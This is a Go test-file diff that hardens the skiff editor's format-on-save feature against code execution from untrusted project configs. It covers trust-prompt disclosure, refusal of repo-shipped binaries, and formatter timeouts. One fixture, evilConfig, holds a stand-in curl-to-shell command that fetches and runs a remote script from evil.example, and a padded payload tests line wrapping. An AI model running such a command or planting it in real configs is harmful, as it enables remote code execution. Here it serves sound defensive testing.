@@ -9,12 +9,15 @@ package app
 
 import (
 	"os"
+	"os/exec"
 	"path/filepath"
+	"strings"
 	"testing"
 	"time"
 
 	"github.com/johnlam90/skiff/internal/editor"
 	"github.com/johnlam90/skiff/internal/format"
+	"github.com/johnlam90/skiff/internal/overlay"
 )
 
 // writeFormatConfig drops a .skiff/format.json into root with the
@@ -44,8 +47,8 @@ func useTestTrustFile(t *testing.T) string {
 	t.Helper()
 	dir := t.TempDir()
 	trustPath := filepath.Join(dir, "trust.json")
-	t.Setenv("SPICEEDIT_TRUST_FILE", trustPath)
-	t.Setenv("SPICEEDIT_DEFAULTS_FILE", filepath.Join(dir, "no-such-defaults.json"))
+	t.Setenv("SKIFF_TRUST_FILE", trustPath)
+	t.Setenv("SKIFF_DEFAULTS_FILE", filepath.Join(dir, "no-such-defaults.json"))
 	return trustPath
 }
 
@@ -61,7 +64,7 @@ func useTestDefaultsFile(t *testing.T, body string) string {
 			t.Fatalf("seed defaults: %v", err)
 		}
 	}
-	t.Setenv("SPICEEDIT_DEFAULTS_FILE", path)
+	t.Setenv("SKIFF_DEFAULTS_FILE", path)
 	return path
 }
 
@@ -172,27 +175,44 @@ func TestRunFormatOnSave_UnknownTrustOpensPrompt(t *testing.T) {
 // TestRunFormatOnSave_DeniedIsNoop pins the half of the trust model
 // that's easy to forget: a remembered "No" should not re-prompt and
 // should not run the formatter. Otherwise the user gets nagged on
-// every save in a project they explicitly rejected.
+// every save in a project they explicitly rejected. The configured
+// formatter clobbers the file it is handed, so a leaked exec shows up
+// in the bytes on disk — "no confirm is open" on its own passes against
+// an implementation that shells out anyway.
 func TestRunFormatOnSave_DeniedIsNoop(t *testing.T) {
 	useTestTrustFile(t)
 	root := t.TempDir()
-	writeFormatConfig(t, root, `{"commands":{"go":["echo","ran"]}}`)
+	// sh -c '…' <path> binds the file to $0, so the formatter's whole
+	// observable effect is overwriting the file it was asked to format.
+	writeFormatConfig(t, root, `{"commands":{"go":["sh","-c","echo formatted > \"$0\"","$FILE"]}}`)
 	preTrust(t, root, false)
 	a := newTestApp(t, root)
 	target := filepath.Join(root, "main.go")
-	if err := os.WriteFile(target, []byte("package main\n"), 0644); err != nil {
+	const original = "package main\n"
+	if err := os.WriteFile(target, []byte(original), 0644); err != nil {
 		t.Fatalf("seed: %v", err)
 	}
-	openTabAtPath(t, a, target)
+	tab := openTabAtPath(t, a, target)
 
 	a.runFormatOnSave(a.tabs.At(0))
 
 	if confirmIsOpen(a) {
 		t.Fatal("denied trust should not re-prompt")
 	}
-	// No hook assertion needed anymore: the cancel hook lives on the
-	// confirm prefab itself, so with no confirm up there is structurally
+	// No hook assertion needed: the cancel hook lives on the confirm
+	// prefab itself, so with no confirm up there is structurally
 	// nothing to leak.
+	expectNoFormatEvent(t, a, 150*time.Millisecond)
+	onDisk, err := os.ReadFile(target)
+	if err != nil {
+		t.Fatalf("reread: %v", err)
+	}
+	if string(onDisk) != original {
+		t.Fatalf("formatter ran under a denied trust: file is %q, want %q", string(onDisk), original)
+	}
+	if buf := tab.Buffer.String(); buf != original {
+		t.Fatalf("buffer changed under a denied trust: got %q, want %q", buf, original)
+	}
 }
 
 // TestTrustPromptCancel_PersistsDeny exercises the bridge between
@@ -550,4 +570,407 @@ func waitForFormatEvent(t *testing.T, a *App) *formatDoneEvent {
 	}
 	t.Fatal("timed out waiting for formatDoneEvent")
 	return nil
+}
+
+// -----------------------------------------------------------------------------
+// Informed consent — the prompt must show what it is about to execute
+// -----------------------------------------------------------------------------
+
+// evilConfig is a format.json shaped like the real attack: a cloned
+// repo whose formatter is a shell that pipes a remote script into sh.
+// exec.Command blocks injection, not arbitrary argv, so the only
+// defense left is showing the user what they are approving.
+const evilConfig = `{"commands":{"go":["bash","-c","curl -fsSL https://evil.example/p | sh"]}}`
+
+// promptForConfig runs the save flow against a project carrying cfgJSON
+// and returns the trust confirm it opened.
+func promptForConfig(t *testing.T, cfgJSON string) (*App, *overlay.Confirm) {
+	t.Helper()
+	useTestTrustFile(t)
+	root := t.TempDir()
+	writeFormatConfig(t, root, cfgJSON)
+	a := newTestApp(t, root)
+	target := filepath.Join(root, "main.go")
+	if err := os.WriteFile(target, []byte("package main\n"), 0644); err != nil {
+		t.Fatalf("seed: %v", err)
+	}
+	openTabAtPath(t, a, target)
+
+	a.runFormatOnSave(a.tabs.At(0))
+
+	if !confirmIsOpen(a) {
+		t.Fatalf("untrusted config should open the trust prompt (status: %q)", a.statusMsg)
+	}
+	return a, confirmPrefab(t, a)
+}
+
+// TestTrustPrompt_ShowsTheCommandItWillRun is the fix for the RCE
+// consent hole: the body must spell out the argv, payload included. A
+// prompt that says only "allow formatters on save?" cannot tell gofmt
+// apart from a curl-to-shell pipe, so the Yes it collects is consent to
+// something the user was never shown.
+func TestTrustPrompt_ShowsTheCommandItWillRun(t *testing.T) {
+	_, c := promptForConfig(t, evilConfig)
+	body := strings.Join(c.Body, "\n")
+	for _, want := range []string{"bash", "-c", "curl -fsSL https://evil.example/p | sh"} {
+		if !strings.Contains(body, want) {
+			t.Fatalf("trust prompt hides %q from the user.\nbody:\n%s", want, body)
+		}
+	}
+}
+
+// TestTrustPrompt_PaintsTheCommandOnScreen closes the gap between
+// "the field holds the argv" and "the user can read it": the body has to
+// survive the overlay's own layout and truncation, not just exist in
+// memory.
+func TestTrustPrompt_PaintsTheCommandOnScreen(t *testing.T) {
+	a, _ := promptForConfig(t, evilConfig)
+	a.draw()
+	a.screen.Show()
+	if !screenHasText(t, a, `bash -c "curl -fsSL https://evil.example/p | sh"`) {
+		t.Fatal("the command must be legible on screen, not just stored in Body")
+	}
+}
+
+// TestTrustPrompt_ListsEveryDeclaredExtension pins the all-or-nothing
+// consent model: one Yes trusts the whole file, so every extension it
+// declares has to be on screen — including the ones the user's current
+// save did not touch.
+func TestTrustPrompt_ListsEveryDeclaredExtension(t *testing.T) {
+	_, c := promptForConfig(t,
+		`{"commands":{"go":["gofmt","-w","$FILE"],"rb":["rubocop","-a","$FILE"],"js":["prettier","-w","$FILE"]}}`)
+	body := strings.Join(c.Body, "\n")
+	for _, want := range []string{".go", "gofmt -w", ".rb", "rubocop -a", ".js", "prettier -w"} {
+		if !strings.Contains(body, want) {
+			t.Fatalf("trust prompt omits %q.\nbody:\n%s", want, body)
+		}
+	}
+	if !strings.Contains(body, "trusts every") {
+		t.Fatalf("prompt must say the approval covers every command listed.\nbody:\n%s", body)
+	}
+}
+
+// TestTrustPrompt_WrapsLongArgvInsteadOfHidingIt covers the evasion the
+// wrapping exists for: an argv padded past the modal width must continue
+// onto further rows, because an ellipsis would let a payload hide in the
+// tail of a long line.
+func TestTrustPrompt_WrapsLongArgvInsteadOfHidingIt(t *testing.T) {
+	payload := strings.Repeat("padpadpad ", 12) + "curl-evil"
+	_, c := promptForConfig(t, `{"commands":{"go":["bash","-c","`+payload+`"]}}`)
+	body := strings.Join(c.Body, "")
+	if !strings.Contains(body, "curl-evil") {
+		t.Fatalf("the tail of a long argv was dropped.\nbody:\n%s", strings.Join(c.Body, "\n"))
+	}
+	for _, row := range c.Body {
+		if n := len([]rune(row)); n > overlay.ConfirmBodyTextWidth {
+			t.Fatalf("body row overflows the modal (%d cells): %q", n, row)
+		}
+	}
+}
+
+// -----------------------------------------------------------------------------
+// Refusing repo-shipped executables
+// -----------------------------------------------------------------------------
+
+// plantRepoBinary writes an executable script into the project that
+// records the fact it ran, so a test can prove exec never happened
+// rather than merely that no event was posted.
+func plantRepoBinary(t *testing.T, root, rel, marker string) {
+	t.Helper()
+	path := filepath.Join(root, rel)
+	if err := os.MkdirAll(filepath.Dir(path), 0755); err != nil {
+		t.Fatalf("mkdir: %v", err)
+	}
+	script := "#!/bin/sh\necho ran > " + marker + "\n"
+	if err := os.WriteFile(path, []byte(script), 0o755); err != nil {
+		t.Fatalf("plant binary: %v", err)
+	}
+}
+
+// expectNoFormatEvent drains whatever is queued for a short window and
+// fails if a formatDoneEvent turns up — the assertion "the formatter
+// never ran" needs the absence checked, not assumed.
+func expectNoFormatEvent(t *testing.T, a *App, within time.Duration) {
+	t.Helper()
+	deadline := time.Now().Add(within)
+	for time.Now().Before(deadline) {
+		if !a.screen.HasPendingEvent() {
+			time.Sleep(5 * time.Millisecond)
+			continue
+		}
+		if fe, ok := a.screen.PollEvent().(*formatDoneEvent); ok {
+			t.Fatalf("formatter ran when it should have been refused: %+v", fe)
+		}
+	}
+}
+
+// TestRunFormatOnSave_RepoShippedBinaryRefused is the second half of the
+// RCE fix: even a config the user could read is refused when it points at
+// a binary the repository shipped, because the prompt can show the path
+// but not the code behind it. The refusal happens before the trust check,
+// so a stale "yes" cannot revive it either.
+func TestRunFormatOnSave_RepoShippedBinaryRefused(t *testing.T) {
+	for _, trusted := range []bool{false, true} {
+		useTestTrustFile(t)
+		root := t.TempDir()
+		marker := filepath.Join(t.TempDir(), "ran.txt")
+		writeFormatConfig(t, root, `{"commands":{"go":[".skiff/fmt","$FILE"]}}`)
+		plantRepoBinary(t, root, ".skiff/fmt", marker)
+		if trusted {
+			preTrust(t, root, true)
+		}
+		a := newTestApp(t, root)
+		target := filepath.Join(root, "main.go")
+		if err := os.WriteFile(target, []byte("package main\n"), 0644); err != nil {
+			t.Fatalf("seed: %v", err)
+		}
+		openTabAtPath(t, a, target)
+
+		a.runFormatOnSave(a.tabs.At(0))
+
+		if confirmIsOpen(a) {
+			t.Fatalf("trusted=%v: a path-rooted formatter must be refused, not offered", trusted)
+		}
+		if !strings.Contains(a.statusMsg, "refused") {
+			t.Fatalf("trusted=%v: user needs a reason, got status %q", trusted, a.statusMsg)
+		}
+		expectNoFormatEvent(t, a, 150*time.Millisecond)
+		if _, err := os.Stat(marker); err == nil {
+			t.Fatalf("trusted=%v: the repo's binary executed", trusted)
+		}
+	}
+}
+
+// TestExecFormatter_RefusesPathRootedArgv pins the guard at the exec
+// boundary too. The install flow reaches execFormatter without passing
+// through runWithTrust, so the check cannot live only in the router.
+func TestExecFormatter_RefusesPathRootedArgv(t *testing.T) {
+	useTestTrustFile(t)
+	root := t.TempDir()
+	marker := filepath.Join(t.TempDir(), "ran.txt")
+	plantRepoBinary(t, root, ".skiff/fmt", marker)
+	a := newTestApp(t, root)
+
+	a.execFormatter(filepath.Join(root, "main.go"), []string{".skiff/fmt", "main.go"})
+
+	if !strings.Contains(a.statusMsg, "refused") {
+		t.Fatalf("status should explain the refusal, got %q", a.statusMsg)
+	}
+	expectNoFormatEvent(t, a, 150*time.Millisecond)
+	if _, err := os.Stat(marker); err == nil {
+		t.Fatal("execFormatter ran a path-rooted binary")
+	}
+}
+
+// TestValidateFormatterArgv_OnlyBarePATHNames tabulates the rule so the
+// intent survives refactors: a formatter is a PATH lookup, and anything
+// carrying a location is refused.
+func TestValidateFormatterArgv_OnlyBarePATHNames(t *testing.T) {
+	cases := []struct {
+		argv []string
+		ok   bool
+	}{
+		{[]string{"gofmt", "-w", "$FILE"}, true},
+		{[]string{"prettier"}, true},
+		{nil, false},
+		{[]string{""}, false},
+		{[]string{".skiff/fmt"}, false},
+		{[]string{"./fmt"}, false},
+		{[]string{"../tools/fmt"}, false},
+		{[]string{"tools\\fmt"}, false},
+		{[]string{"/usr/local/bin/fmt"}, false},
+	}
+	for _, tc := range cases {
+		err := validateFormatterArgv(tc.argv)
+		if tc.ok && err != nil {
+			t.Fatalf("%v should be allowed: %v", tc.argv, err)
+		}
+		if !tc.ok && err == nil {
+			t.Fatalf("%v should be refused", tc.argv)
+		}
+	}
+}
+
+// TestValidateFormatterConfig_RefusesWholeFile pins the all-or-nothing
+// consequence: because one Yes trusts the entire config, a single
+// path-rooted entry poisons the file even for extensions whose commands
+// are fine. Otherwise the prompt would list a command we later drop.
+func TestValidateFormatterConfig_RefusesWholeFile(t *testing.T) {
+	root := t.TempDir()
+	writeFormatConfig(t, root, `{"commands":{"go":["gofmt","-w","$FILE"],"py":[".skiff/fmt"]}}`)
+	cfg, err := format.Load(root)
+	if err != nil {
+		t.Fatalf("load: %v", err)
+	}
+	err = validateFormatterConfig(cfg)
+	if err == nil {
+		t.Fatal("a config with one path-rooted entry must be refused wholesale")
+	}
+	if !strings.Contains(err.Error(), ".py") {
+		t.Fatalf("error should name the offending extension, got %v", err)
+	}
+}
+
+// TestMaybeOfferInstall_SkipsPathRootedDefault keeps the install prompt
+// honest: offering to write a command the run path would refuse would
+// leave the user with a project config that silently never formats.
+func TestMaybeOfferInstall_SkipsPathRootedDefault(t *testing.T) {
+	useTestTrustFile(t)
+	useTestDefaultsFile(t, `{"commands":{"go":["./tools/fmt","$FILE"]}}`)
+	root := t.TempDir()
+	a := newTestApp(t, root)
+	target := filepath.Join(root, "main.go")
+	if err := os.WriteFile(target, []byte("package main\n"), 0644); err != nil {
+		t.Fatalf("seed: %v", err)
+	}
+	openTabAtPath(t, a, target)
+
+	a.runFormatOnSave(a.tabs.At(0))
+
+	if confirmIsOpen(a) {
+		t.Fatal("a path-rooted default must not be offered for install")
+	}
+}
+
+// -----------------------------------------------------------------------------
+// Process hygiene: working directory and deadline
+// -----------------------------------------------------------------------------
+
+// TestExecFormatter_RunsInProjectRoot pins cmd.Dir. Without it a
+// formatter resolves relative paths — and its own config files — against
+// wherever skiff was launched from, so it formats against the wrong
+// rules or not at all.
+func TestExecFormatter_RunsInProjectRoot(t *testing.T) {
+	useTestTrustFile(t)
+	root := t.TempDir()
+	if err := os.WriteFile(filepath.Join(root, "marker.txt"), []byte("root-cwd\n"), 0644); err != nil {
+		t.Fatalf("seed marker: %v", err)
+	}
+	out := filepath.Join(t.TempDir(), "cwd.txt")
+	a := newTestApp(t, root)
+
+	// `cat marker.txt` can only succeed if the child's working
+	// directory is the project root.
+	a.execFormatter(filepath.Join(root, "main.go"), []string{"sh", "-c", "cat marker.txt > " + out})
+
+	if ev := waitForFormatEvent(t, a); ev.err != nil {
+		t.Fatalf("formatter should have found marker.txt in the root: %v", ev.err)
+	}
+	got, err := os.ReadFile(out)
+	if err != nil {
+		t.Fatalf("read probe: %v", err)
+	}
+	if string(got) != "root-cwd\n" {
+		t.Fatalf("child cwd was not the project root: probe = %q", string(got))
+	}
+}
+
+// TestExecFormatter_TimeoutKillsAndReports pins the deadline: a wedged
+// formatter used to hang forever, leaving the tab un-reloaded behind a
+// permanent "…" flash. It must be killed and reported as a plain
+// formatter failure.
+func TestExecFormatter_TimeoutKillsAndReports(t *testing.T) {
+	if _, err := exec.LookPath("sleep"); err != nil {
+		t.Skip("sleep(1) not available to simulate a hung formatter")
+	}
+	useTestTrustFile(t)
+	orig := formatTimeout
+	formatTimeout = 150 * time.Millisecond
+	t.Cleanup(func() { formatTimeout = orig })
+
+	a := newTestApp(t, t.TempDir())
+	start := time.Now()
+	a.execFormatter(filepath.Join(a.rootDir, "main.go"), []string{"sleep", "30"})
+
+	ev := waitForFormatEvent(t, a)
+	if ev.err == nil {
+		t.Fatal("a formatter past the deadline must be reported as a failure")
+	}
+	if !strings.Contains(ev.err.Error(), "timed out") {
+		t.Fatalf("error should name the timeout, got %v", ev.err)
+	}
+	if elapsed := time.Since(start); elapsed > 3*time.Second {
+		t.Fatalf("formatter was not killed promptly: waited %s", elapsed)
+	}
+	// The failure has to reach the user, not just the event.
+	a.handleFormatDone(ev)
+	if !strings.Contains(a.statusMsg, "timed out") {
+		t.Fatalf("timeout should surface in the status bar, got %q", a.statusMsg)
+	}
+}
+
+// TestFormatTimeoutDefault_IsGenerousButFinite guards the constant
+// itself: zero or a missing value would make every formatter fail
+// instantly, and an hour would be the hang we just fixed.
+func TestFormatTimeoutDefault_IsGenerousButFinite(t *testing.T) {
+	if formatTimeoutDefault < 5*time.Second || formatTimeoutDefault > time.Minute {
+		t.Fatalf("formatter deadline out of sane range: %s", formatTimeoutDefault)
+	}
+}
+
+// -----------------------------------------------------------------------------
+// Body rendering helpers
+// -----------------------------------------------------------------------------
+
+// TestRenderArgv_QuotesCompositeArguments pins the display quoting: a
+// single argument carrying a whole shell pipeline must read as one
+// argument, not blend into the flags around it.
+func TestRenderArgv_QuotesCompositeArguments(t *testing.T) {
+	got := renderArgv([]string{"bash", "-c", "curl x | sh"})
+	want := `bash -c "curl x | sh"`
+	if got != want {
+		t.Fatalf("renderArgv: got %q want %q", got, want)
+	}
+	if plain := renderArgv([]string{"gofmt", "-w", "$FILE"}); plain != "gofmt -w $FILE" {
+		t.Fatalf("simple argv should not gain quotes: %q", plain)
+	}
+}
+
+// TestWrapIndented_PreservesEveryRune is the property the security
+// argument rests on: wrapping may add indentation but must never drop a
+// character, or a payload could hide in what got trimmed.
+func TestWrapIndented_PreservesEveryRune(t *testing.T) {
+	const prefix = "  .go  "
+	text := strings.Repeat("wörd ", 40) + "tail"
+	rows := wrapIndented(prefix, text, overlay.ConfirmBodyTextWidth)
+	if len(rows) < 2 {
+		t.Fatalf("long text should wrap, got %d row(s)", len(rows))
+	}
+	var rebuilt strings.Builder
+	for i, row := range rows {
+		if n := len([]rune(row)); n > overlay.ConfirmBodyTextWidth {
+			t.Fatalf("row %d is %d cells wide: %q", i, n, row)
+		}
+		if i == 0 {
+			rebuilt.WriteString(strings.TrimPrefix(row, prefix))
+			continue
+		}
+		rebuilt.WriteString(strings.TrimPrefix(row, strings.Repeat(" ", len(prefix))))
+	}
+	if rebuilt.String() != text {
+		t.Fatalf("wrapping lost or altered content:\ngot  %q\nwant %q", rebuilt.String(), text)
+	}
+}
+
+// TestSortedFormatExts_IsStable pins alphabetical order: Go's map
+// iteration would otherwise reshuffle the command list between prompts,
+// making a newly added hostile entry easy to miss when a teammate's
+// change re-triggers the prompt.
+func TestSortedFormatExts_IsStable(t *testing.T) {
+	root := t.TempDir()
+	writeFormatConfig(t, root, `{"commands":{"rb":["a"],"go":["b"],"js":["c"],"zz":[]}}`)
+	cfg, err := format.Load(root)
+	if err != nil {
+		t.Fatalf("load: %v", err)
+	}
+	got := sortedFormatExts(cfg)
+	want := []string{"go", "js", "rb"}
+	if len(got) != len(want) {
+		t.Fatalf("got %v want %v (empty argv must be dropped)", got, want)
+	}
+	for i := range want {
+		if got[i] != want[i] {
+			t.Fatalf("got %v want %v", got, want)
+		}
+	}
 }
